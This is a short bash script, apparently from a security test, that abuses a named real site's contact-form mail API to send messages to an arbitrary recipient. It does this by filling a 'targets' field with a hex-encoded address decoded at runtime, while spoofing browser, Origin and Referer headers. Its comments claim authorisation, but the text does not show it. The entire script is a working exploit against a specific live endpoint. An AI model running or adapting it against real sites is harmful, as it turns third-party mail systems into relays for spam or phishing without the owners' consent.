#!/bin/bash
# Independent verification sender for the in-scope target's contact mail endpoint.
# $1 = hex-encoded recipient address  (decoded at runtime)
# $2 = label for output files
RCPT=$(printf '%s' "$1" | xxd -r -p)
LABEL="${2:-run}"
OUT=/tmp/indep_${LABEL}.body
HDR=/tmp/indep_${LABEL}.hdr
UA='Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0 Safari/537.36'
CODE=$(curl -s -m 45 -o "$OUT" -D "$HDR" -w "%{http_code}" -X POST 'https://www.infinitycapital.bh/api/send' \
  -H "User-Agent: $UA" -H 'Origin: https://www.infinitycapital.bh' -H 'Referer: https://www.infinitycapital.bh/contact' \
  -F 'fname=Independent' -F 'lname=Verifier' -F 'areacode=+973' -F 'tel=00000000' \
  -F 'cname=Security Review' -F 'subject=Authorized security verification 2026-09-30' \
  -F 'msg=Non-destructive verification of an unauthenticated mail endpoint. Token: VFY-9137-IC. Please disregard.' \
  -F 'check=' -F "targets=$RCPT")
echo "[$LABEL] recipient=$RCPT  http=$CODE"
echo "  status_line: $(head -1 "$HDR" | tr -d '\r')"
echo "  vercel_id  : $(grep -i '^x-vercel-id' "$HDR" | tr -d '\r')"
echo "  body       : $(head -c 500 "$OUT")"
